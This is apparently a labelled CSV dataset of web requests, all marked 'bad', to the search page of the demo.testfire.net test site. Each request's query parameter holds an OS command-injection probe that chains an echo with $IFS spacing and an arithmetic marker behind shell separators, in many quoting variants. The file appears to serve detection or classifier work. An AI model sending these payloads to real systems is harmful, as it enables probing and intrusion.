path,content,host,class_flag
"/search.jsp?query="";echo$IFSRBNXNK$((31+22))$(echo$IFSRBNXNK)RBNXNK|",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSTZXMJD$((12+74))$(echo$IFSTZXMJD)TZXMJD|",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSIQYKZJ$((13+97))$(echo$IFSIQYKZJ)IQYKZJ|",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSTGMYGU$((64+59))$(echo$IFSTGMYGU)TGMYGU|",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSUTEHBK$((73+4))$(echo$IFSUTEHBK)UTEHBK|",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSNPYCHN$((67+35))$(echo$IFSNPYCHN)NPYCHN|",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSLWFTCJ$((19+88))$(echo$IFSLWFTCJ)LWFTCJ|",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSVHAUOY$((79+26))$(echo$IFSVHAUOY)VHAUOY|",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSTNMDEE$((29+83))$(echo$IFSTNMDEE)TNMDEE|",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSEICSZJ$((51+32))$(echo$IFSEICSZJ)EICSZJ|",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSBAKJOM$((61+8))$(echo$IFSBAKJOM)BAKJOM|",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSJUCOSG$((27+40))$(echo$IFSJUCOSG)JUCOSG'",,demo.testfire.net,['bad']
"/search.jsp?query="" echo HLEPQM$((13+16))$(echo HLEPQM)HLEPQM'",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSIEYMTU$((1+88))$(echo$IFSIEYMTU)IEYMTU'",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSHQDBCP$((68+4))$(echo$IFSHQDBCP)HQDBCP'",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSQWZGUZ$((67+7))$(echo$IFSQWZGUZ)QWZGUZ'",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSDTOBHC$((30+47))$(echo$IFSDTOBHC)DTOBHC'",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSKGECJW$((94+78))$(echo$IFSKGECJW)KGECJW'",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSUTHJSW$((11+12))$(echo$IFSUTHJSW)UTHJSW'",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSTCLHEV$((0+38))$(echo$IFSTCLHEV)TCLHEV'",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSNPBSWH$((19+90))$(echo$IFSNPBSWH)NPBSWH'",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSBMSDKL$((25+99))$(echo$IFSBMSDKL)BMSDKL'",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSUSGSMP$((39+12))$(echo$IFSUSGSMP)USGSMP'",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSZJBERF$((35+91))$(echo$IFSZJBERF)ZJBERF'",,demo.testfire.net,['bad']
"/search.jsp?query="" echo ZELXMV$((25+23))$(echo ZELXMV)ZELXMV""",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSJBTZFF$((9+76))$(echo$IFSJBTZFF)JBTZFF""",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSCOXAAL$((47+23))$(echo$IFSCOXAAL)COXAAL""",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSWFDEUL$((80+90))$(echo$IFSWFDEUL)WFDEUL""",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSEYJFJS$((66+81))$(echo$IFSEYJFJS)EYJFJS""",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSUMCJZQ$((83+7))$(echo$IFSUMCJZQ)UMCJZQ""",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSTCFOHQ$((83+93))$(echo$IFSTCFOHQ)TCFOHQ""",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSWVTSGH$((63+36))$(echo$IFSWVTSGH)WVTSGH""",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSLKBKVH$((78+91))$(echo$IFSLKBKVH)LKBKVH""",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSIETGIV$((33+31))$(echo$IFSIETGIV)IETGIV""",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSUDIYDY$((28+5))$(echo$IFSUDIYDY)UDIYDY""",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSVOMUAL$((49+92))$(echo$IFSVOMUAL)VOMUAL""",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSXHMLVN$((71+63))$(echo$IFSXHMLVN)XHMLVN""",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSEBQHZC$((54+58))$(echo$IFSEBQHZC)EBQHZC\\",,demo.testfire.net,['bad']
"/search.jsp?query="" echo DXYHWC$((70+59))$(echo DXYHWC)DXYHWC\\",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSBKQZPW$((40+60))$(echo$IFSBKQZPW)BKQZPW\\",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSBYMLDE$((27+63))$(echo$IFSBYMLDE)BYMLDE\\",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSHWGVIM$((90+18))$(echo$IFSHWGVIM)HWGVIM\\",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSANXKRH$((27+96))$(echo$IFSANXKRH)ANXKRH\\",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSZDMIIV$((60+55))$(echo$IFSZDMIIV)ZDMIIV\\",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSECUVPP$((94+69))$(echo$IFSECUVPP)ECUVPP\\",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSXMIXIV$((74+96))$(echo$IFSXMIXIV)XMIXIV\\",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSEVHWEV$((99+12))$(echo$IFSEVHWEV)EVHWEV\\",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSKPOBYP$((90+6))$(echo$IFSKPOBYP)KPOBYP\\",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSOQPWKQ$((62+90))$(echo$IFSOQPWKQ)OQPWKQ\\",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSFUISVY$((37+75))$(echo$IFSFUISVY)FUISVY\\",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSPXHSMC$((2+51))$(echo$IFSPXHSMC)PXHSMC//",,demo.testfire.net,['bad']
"/search.jsp?query="" echo CCPWJP$((28+45))$(echo CCPWJP)CCPWJP//",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSPNIBTX$((67+98))$(echo$IFSPNIBTX)PNIBTX//",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSQOVIJM$((98+90))$(echo$IFSQOVIJM)QOVIJM//",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSNEANFV$((47+58))$(echo$IFSNEANFV)NEANFV//",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSKQELND$((18+15))$(echo$IFSKQELND)KQELND//",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSALIQNR$((1+51))$(echo$IFSALIQNR)ALIQNR//",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSVMXLXF$((85+89))$(echo$IFSVMXLXF)VMXLXF//",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSEJXJHO$((22+15))$(echo$IFSEJXJHO)EJXJHO//",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSQJRCGM$((21+21))$(echo$IFSQJRCGM)QJRCGM//",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSQZIYEJ$((0+21))$(echo$IFSQZIYEJ)QZIYEJ//",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSDRZFAI$((10+79))$(echo$IFSDRZFAI)DRZFAI//",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSXPSNLK$((16+69))$(echo$IFSXPSNLK)XPSNLK//",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSYOHOJL$((56+39))$(echo$IFSYOHOJL)YOHOJL&",,demo.testfire.net,['bad']
"/search.jsp?query="" echo XXGYFR$((27+40))$(echo XXGYFR)XXGYFR&",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSHREURS$((4+58))$(echo$IFSHREURS)HREURS&",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSWGOXEF$((82+13))$(echo$IFSWGOXEF)WGOXEF&",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSVUODLE$((87+48))$(echo$IFSVUODLE)VUODLE&",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSQAACSL$((16+49))$(echo$IFSQAACSL)QAACSL&",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSEBZXUY$((79+44))$(echo$IFSEBZXUY)EBZXUY&",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSGKNCHV$((13+8))$(echo$IFSGKNCHV)GKNCHV&",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSBYDVLH$((40+59))$(echo$IFSBYDVLH)BYDVLH&",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSUGHPED$((99+93))$(echo$IFSUGHPED)UGHPED&",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSJIGDYZ$((64+13))$(echo$IFSJIGDYZ)JIGDYZ&",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSWRMIXV$((36+74))$(echo$IFSWRMIXV)WRMIXV&",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSGSYMFU$((44+78))$(echo$IFSGSYMFU)GSYMFU&",,demo.testfire.net,['bad']
"/search.jsp?query=""echo$IFSXVVJRH$((4+71))$(echo$IFSXVVJRH)XVVJRH|",,demo.testfire.net,['bad']
"/search.jsp?query="" echo LWNPLT$((96+42))$(echo LWNPLT)LWNPLT|",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSUOJTRY$((93+10))$(echo$IFSUOJTRY)UOJTRY|",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSGVEIAO$((60+74))$(echo$IFSGVEIAO)GVEIAO|",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSIJEOUD$((95+12))$(echo$IFSIJEOUD)IJEOUD|",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSOJFYUI$((71+37))$(echo$IFSOJFYUI)OJFYUI|",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSCYRNGO$((16+47))$(echo$IFSCYRNGO)CYRNGO|",,demo.testfire.net,['bad']
"/search.jsp?query=""
echo$IFSURWJYQ$((9+54))$(echo$IFSURWJYQ)URWJYQ|",,demo.testfire.net,['bad']
"/search.jsp?query="";echo$IFSRPJGSG$((43+49))$(echo$IFSRPJGSG)RPJGSG|",,demo.testfire.net,['bad']
"/search.jsp?query=""&echo$IFSLJECUX$((80+24))$(echo$IFSLJECUX)LJECUX|",,demo.testfire.net,['bad']
"/search.jsp?query=""&&echo$IFSBQHTLW$((57+18))$(echo$IFSBQHTLW)BQHTLW|",,demo.testfire.net,['bad']
"/search.jsp?query=""|echo$IFSXVXORA$((57+55))$(echo$IFSXVXORA)XVXORA|",,demo.testfire.net,['bad']
"/search.jsp?query=""||echo$IFSBNKMZL$((51+20))$(echo$IFSBNKMZL)BNKMZL|",,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSOKJGAG$((39+76))$(echo$IFSOKJGAG)OKJGAG,,demo.testfire.net,['bad']
/search.jsp?query=| echo HCOMBJ$((69+6))$(echo HCOMBJ)HCOMBJ,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSXAJUQV$((80+48))$(echo$IFSXAJUQV)XAJUQV,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSOHDHIG$((24+5))$(echo$IFSOHDHIG)OHDHIG,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSYHJJYR$((16+67))$(echo$IFSYHJJYR)YHJJYR,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSCGCLSD$((78+73))$(echo$IFSCGCLSD)CGCLSD,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKJOVJF$((86+99))$(echo$IFSKJOVJF)KJOVJF,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSOGNJPF$((26+51))$(echo$IFSOGNJPF)OGNJPF",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSKZGJJF$((9+27))$(echo$IFSKZGJJF)KZGJJF,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSDEDUEE$((30+57))$(echo$IFSDEDUEE)DEDUEE,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSHKWBBD$((73+37))$(echo$IFSHKWBBD)HKWBBD,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSGZSLCQ$((53+35))$(echo$IFSGZSLCQ)GZSLCQ,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSJRICXJ$((75+92))$(echo$IFSJRICXJ)JRICXJ,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSHWDYSD$((37+57))$(echo$IFSHWDYSD)HWDYSD',,demo.testfire.net,['bad']
/search.jsp?query= echo NEBPFW$((3+70))$(echo NEBPFW)NEBPFW',,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSEPLQYO$((94+56))$(echo$IFSEPLQYO)EPLQYO',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSTTHLQC$((84+38))$(echo$IFSTTHLQC)TTHLQC',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSGKBHIR$((84+74))$(echo$IFSGKBHIR)GKBHIR',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSSBWRDD$((13+29))$(echo$IFSSBWRDD)SBWRDD',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKIKNVD$((50+78))$(echo$IFSKIKNVD)KIKNVD',,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSOFYRTU$((52+75))$(echo$IFSOFYRTU)OFYRTU'",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSJPYDWY$((21+37))$(echo$IFSJPYDWY)JPYDWY',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSXCPZTM$((92+95))$(echo$IFSXCPZTM)XCPZTM',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSWOKOCD$((20+68))$(echo$IFSWOKOCD)WOKOCD',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSSUUIHX$((40+15))$(echo$IFSSUUIHX)SUUIHX',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSAVXTXG$((18+58))$(echo$IFSAVXTXG)AVXTXG',,demo.testfire.net,['bad']
"/search.jsp?query=echo$IFSXXONVG$((27+27))$(echo$IFSXXONVG)XXONVG""",,demo.testfire.net,['bad']
"/search.jsp?query= echo PFLQEA$((81+37))$(echo PFLQEA)PFLQEA""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSMDODNG$((16+33))$(echo$IFSMDODNG)MDODNG""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSUFORJE$((32+39))$(echo$IFSUFORJE)UFORJE""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSBTKIBL$((76+11))$(echo$IFSBTKIBL)BTKIBL""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSZVZDHM$((59+26))$(echo$IFSZVZDHM)ZVZDHM""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSLWMKLS$((30+88))$(echo$IFSLWMKLS)LWMKLS""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSCJKHEO$((35+18))$(echo$IFSCJKHEO)CJKHEO""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSUSDTON$((86+41))$(echo$IFSUSDTON)USDTON""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSIAHRZI$((77+68))$(echo$IFSIAHRZI)IAHRZI""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSONQKZZ$((73+7))$(echo$IFSONQKZZ)ONQKZZ""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSYRTPVW$((55+57))$(echo$IFSYRTPVW)YRTPVW""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSMXRPLY$((63+48))$(echo$IFSMXRPLY)MXRPLY""",,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSBPKGGQ$((2+10))$(echo$IFSBPKGGQ)BPKGGQ,,demo.testfire.net,['bad']
/search.jsp?query= echo EPJLZM$((66+41))$(echo EPJLZM)EPJLZM,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSFRFTEV$((68+37))$(echo$IFSFRFTEV)FRFTEV,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSNNJHEA$((98+76))$(echo$IFSNNJHEA)NNJHEA,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSDJRUFH$((97+3))$(echo$IFSDJRUFH)DJRUFH,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSYXCWNR$((16+34))$(echo$IFSYXCWNR)YXCWNR,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSSUKTVK$((49+30))$(echo$IFSSUKTVK)SUKTVK,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSRASFNL$((85+74))$(echo$IFSRASFNL)RASFNL",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSHNITQI$((34+44))$(echo$IFSHNITQI)HNITQI,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSFQWXOL$((0+18))$(echo$IFSFQWXOL)FQWXOL,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSJLTIEA$((92+83))$(echo$IFSJLTIEA)JLTIEA,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSJFVTNC$((92+51))$(echo$IFSJFVTNC)JFVTNC,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSOTLHMR$((33+79))$(echo$IFSOTLHMR)OTLHMR,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSRDFLJS$((32+99))$(echo$IFSRDFLJS)RDFLJS//,,demo.testfire.net,['bad']
/search.jsp?query= echo EBRLPU$((95+26))$(echo EBRLPU)EBRLPU//,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSLFANAU$((10+58))$(echo$IFSLFANAU)LFANAU//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSASNAHP$((25+52))$(echo$IFSASNAHP)ASNAHP//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSYIICFW$((82+30))$(echo$IFSYIICFW)YIICFW//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSANCXJL$((61+40))$(echo$IFSANCXJL)ANCXJL//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKMSEPJ$((48+32))$(echo$IFSKMSEPJ)KMSEPJ//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSKIZTDU$((42+50))$(echo$IFSKIZTDU)KIZTDU//",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSYTBVMU$((36+61))$(echo$IFSYTBVMU)YTBVMU//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSQOEJNZ$((82+42))$(echo$IFSQOEJNZ)QOEJNZ//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSCGEGYR$((45+27))$(echo$IFSCGEGYR)CGEGYR//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSEQEOTH$((5+24))$(echo$IFSEQEOTH)EQEOTH//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSTGFHRF$((49+19))$(echo$IFSTGFHRF)TGFHRF//,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSOKGHZD$((31+37))$(echo$IFSOKGHZD)OKGHZD\,,demo.testfire.net,['bad']
/search.jsp?query= echo LHYXBV$((13+29))$(echo LHYXBV)LHYXBV\,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSOZHGXS$((54+58))$(echo$IFSOZHGXS)OZHGXS\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSQCRUCK$((10+80))$(echo$IFSQCRUCK)QCRUCK\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSJJVJHF$((77+32))$(echo$IFSJJVJHF)JJVJHF\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSVMDOKC$((46+15))$(echo$IFSVMDOKC)VMDOKC\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSMRIURT$((57+24))$(echo$IFSMRIURT)MRIURT\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSDEIFSG$((86+72))$(echo$IFSDEIFSG)DEIFSG\",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSOIOFGF$((91+26))$(echo$IFSOIOFGF)OIOFGF\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSOKMGIJ$((46+23))$(echo$IFSOKMGIJ)OKMGIJ\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSBAXLLS$((32+52))$(echo$IFSBAXLLS)BAXLLS\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSHYXPLP$((94+38))$(echo$IFSHYXPLP)HYXPLP\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSARRLJF$((7+15))$(echo$IFSARRLJF)ARRLJF\,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSUHEKZF$((6+76))$(echo$IFSUHEKZF)UHEKZF&,,demo.testfire.net,['bad']
/search.jsp?query= echo OQWHLF$((94+68))$(echo OQWHLF)OQWHLF&,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSLZAMMD$((45+83))$(echo$IFSLZAMMD)LZAMMD&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSXXOEKT$((47+54))$(echo$IFSXXOEKT)XXOEKT&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSJEBQGT$((57+73))$(echo$IFSJEBQGT)JEBQGT&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSREJVUL$((89+39))$(echo$IFSREJVUL)REJVUL&,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSTMJSKG$((79+42))$(echo$IFSTMJSKG)TMJSKG&",,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSLUKZZL$((74+87))$(echo$IFSLUKZZL)LUKZZL&,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSNELFTT$((30+5))$(echo$IFSNELFTT)NELFTT&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSIQEANB$((37+80))$(echo$IFSIQEANB)IQEANB&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSCJZPXI$((34+11))$(echo$IFSCJZPXI)CJZPXI&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSFQIXOT$((96+55))$(echo$IFSFQIXOT)FQIXOT&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSUZTFEA$((9+38))$(echo$IFSUZTFEA)UZTFEA&,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSWBZKTL$((54+51))$(echo$IFSWBZKTL)WBZKTL|,,demo.testfire.net,['bad']
/search.jsp?query= echo ZBSMBN$((3+0))$(echo ZBSMBN)ZBSMBN|,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSBISSCY$((69+34))$(echo$IFSBISSCY)BISSCY|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSJTCTWE$((47+19))$(echo$IFSJTCTWE)JTCTWE|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSVPEXDU$((58+80))$(echo$IFSVPEXDU)VPEXDU|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSLYCEOO$((22+78))$(echo$IFSLYCEOO)LYCEOO|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSAOWKBV$((93+9))$(echo$IFSAOWKBV)AOWKBV|,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSKSUTZJ$((41+59))$(echo$IFSKSUTZJ)KSUTZJ|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSHAFMRE$((74+52))$(echo$IFSHAFMRE)HAFMRE|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSEZIXEG$((12+57))$(echo$IFSEZIXEG)EZIXEG|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSJHIHOY$((80+94))$(echo$IFSJHIHOY)JHIHOY|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSVZAWQN$((40+93))$(echo$IFSVZAWQN)VZAWQN|,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSXIHMMK$((37+0))$(echo$IFSXIHMMK)XIHMMK',,demo.testfire.net,['bad']
/search.jsp?query= echo AXKFNN$((42+98))$(echo AXKFNN)AXKFNN',,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSXRJTLU$((75+30))$(echo$IFSXRJTLU)XRJTLU',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSHURAOO$((4+19))$(echo$IFSHURAOO)HURAOO',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSRRFVYH$((99+28))$(echo$IFSRRFVYH)RRFVYH',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSFHYCZU$((73+44))$(echo$IFSFHYCZU)FHYCZU',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSVOFPVM$((35+53))$(echo$IFSVOFPVM)VOFPVM',,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSBFBVGP$((41+59))$(echo$IFSBFBVGP)BFBVGP'",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSOECCYB$((90+42))$(echo$IFSOECCYB)OECCYB',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSUTPJYK$((7+24))$(echo$IFSUTPJYK)UTPJYK',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSLUCMYV$((14+43))$(echo$IFSLUCMYV)LUCMYV',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSPVRRTF$((94+25))$(echo$IFSPVRRTF)PVRRTF',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSEKSDKJ$((57+57))$(echo$IFSEKSDKJ)EKSDKJ',,demo.testfire.net,['bad']
"/search.jsp?query=echo$IFSFMNKKS$((72+97))$(echo$IFSFMNKKS)FMNKKS""",,demo.testfire.net,['bad']
"/search.jsp?query= echo BRUWPJ$((24+60))$(echo BRUWPJ)BRUWPJ""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSVBYBZW$((39+43))$(echo$IFSVBYBZW)VBYBZW""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSLMIPEM$((82+21))$(echo$IFSLMIPEM)LMIPEM""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSIEVIHG$((35+50))$(echo$IFSIEVIHG)IEVIHG""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSEULBCJ$((35+20))$(echo$IFSEULBCJ)EULBCJ""",,demo.testfire.net,['bad']
